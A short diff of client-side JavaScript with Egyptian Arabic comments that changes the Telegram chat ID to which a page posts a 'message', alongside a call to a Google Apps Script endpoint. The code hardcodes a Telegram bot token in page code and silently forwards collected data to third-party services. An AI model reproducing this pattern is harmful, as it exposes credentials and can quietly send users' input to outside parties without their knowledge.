@@ -138,15 +138,15 @@
 
         // ابعت البيانات دي لـ Telegram Webhook
         fetch("https://api.telegram.org/bot7661069709:AAGR_xR9p1sZoc_-Xvynqdn5aMVpp_ph84U/sendMessage", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: "708606868",  // Chat ID بتاعك
-            text: message
-          })
-        });
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    chat_id: "1193959724",  // Chat ID الصحيح
+    text: message
+  })
+});
 
         // ابعت البيانات دي لـ Google Sheets Web App
         fetch('https://script.google.com/macros/s/AKfycbwzNTovUiqUlRJ6mOSP5lzWGxIZ3ofpHdVk3IqUiJ0XBQvF4j3hKd11HbvhBl1TpTlicw/exec', {
